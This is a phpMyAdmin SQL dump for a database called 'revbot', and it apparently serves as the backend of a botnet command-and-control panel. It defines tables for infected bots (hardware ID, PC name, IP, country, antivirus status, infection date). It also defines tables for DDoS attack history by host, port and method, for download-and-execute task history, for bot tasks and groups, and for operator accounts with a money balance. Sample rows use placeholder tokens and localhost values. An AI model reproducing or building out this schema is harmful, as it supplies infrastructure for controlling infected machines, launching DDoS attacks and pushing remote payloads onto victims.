-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1:3306
-- Généré le : lun. 07 juil. 2025 à 05:02
-- Version du serveur : 9.1.0
-- Version de PHP : 7.4.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données : `revbot`
--

-- --------------------------------------------------------

--
-- Structure de la table `api_key`
--

DROP TABLE IF EXISTS `api_key`;
CREATE TABLE IF NOT EXISTS `api_key` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `API_KEY` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `REQUEST` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Déchargement des données de la table `api_key`
--

INSERT INTO `api_key` (`ID`, `API_KEY`, `REQUEST`) VALUES
(1, 'TESTAPIKEY', '0');

-- --------------------------------------------------------

--
-- Structure de la table `bots`
--

DROP TABLE IF EXISTS `bots`;
CREATE TABLE IF NOT EXISTS `bots` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `USER_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `GROUP_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `HWID` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `PCNAME` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `USERNAME` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `COUNTRY` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `IP` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `BUSY` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `STATUS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `LASTREQUEST` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `ONLINE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `ANTI_VIRUS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `INFECTED_DATE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `XUSE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `CREATED` date NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Déchargement des données de la table `bots`
--

INSERT INTO `bots` (`ID`, `TOKEN`, `USER_TOKEN`, `GROUP_TOKEN`, `HWID`, `PCNAME`, `USERNAME`, `COUNTRY`, `IP`, `BUSY`, `STATUS`, `LASTREQUEST`, `ONLINE`, `ANTI_VIRUS`, `INFECTED_DATE`, `XUSE`, `CREATED`) VALUES
(2, 'BOT_ukyC0lDajRe5hZ69o1Hi', 'USER_wCqXVKeWEkaAzd5PsGZY', 'GROUP_9jZ58W2NoyFA7mxGSY0l', 'EXMPLE', 'EXMPLE', 'EXMPLE', 'Unknown', '::1', '1', '1', '1751864482', '1751864482', 'No Antivirus Found', '1751864472', '1', '2025-07-07');

-- --------------------------------------------------------

--
-- Structure de la table `ddos_history`
--

DROP TABLE IF EXISTS `ddos_history`;
CREATE TABLE IF NOT EXISTS `ddos_history` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `TASK_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `HOST` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `PORT` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `METHOD` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `DURATION` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `MBPS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `RS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `RUN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `CREATED` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=26 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Structure de la table `dlexec_history`
--

DROP TABLE IF EXISTS `dlexec_history`;
CREATE TABLE IF NOT EXISTS `dlexec_history` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `TASK_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `URL` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `ACCESS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `RUN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `CREATED` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Structure de la table `groups`
--

DROP TABLE IF EXISTS `groups`;
CREATE TABLE IF NOT EXISTS `groups` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `USER_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `NAME` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `STATUS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Déchargement des données de la table `groups`
--

INSERT INTO `groups` (`ID`, `TOKEN`, `USER_TOKEN`, `NAME`, `STATUS`) VALUES
(7, 'GROUP_9jZ58W2NoyFA7mxGSY0l', 'USER_wCqXVKeWEkaAzd5PsGZY', 'default', '1');

-- --------------------------------------------------------

--
-- Structure de la table `run_history`
--

DROP TABLE IF EXISTS `run_history`;
CREATE TABLE IF NOT EXISTS `run_history` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `TASK_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `HWID` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `USE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `CREATED` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=153 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Structure de la table `tasks`
--

DROP TABLE IF EXISTS `tasks`;
CREATE TABLE IF NOT EXISTS `tasks` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `USER_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `GROUP_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `BOT_TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `TYPE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `ARG_ARRAY` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `STATUS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `EXPIRE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `RUN_ONCE` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `COUNT_EXEC` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `CREATED` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=54 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `ID` int NOT NULL AUTO_INCREMENT,
  `TOKEN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `USERNAME` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `PASSWORD` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `LASTIP` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `FINGERPRINT` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `STATUS` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `RANK` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `LASTLOGIN` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `REGISTER` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `MONEY` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  UNIQUE KEY `ID` (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Déchargement des données de la table `users`
--

INSERT INTO `users` (`ID`, `TOKEN`, `USERNAME`, `PASSWORD`, `LASTIP`, `FINGERPRINT`, `STATUS`, `RANK`, `LASTLOGIN`, `REGISTER`, `MONEY`) VALUES
(1, 'USER_wCqXVKeWEkaAzd5PsGZY', 'cybernrv', 'XXXXXXXXXX', '127.0.0.1', 'XXXXXXXXXXXXXXXXX', '1', '0', '1710369722', '1710369722', '');
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
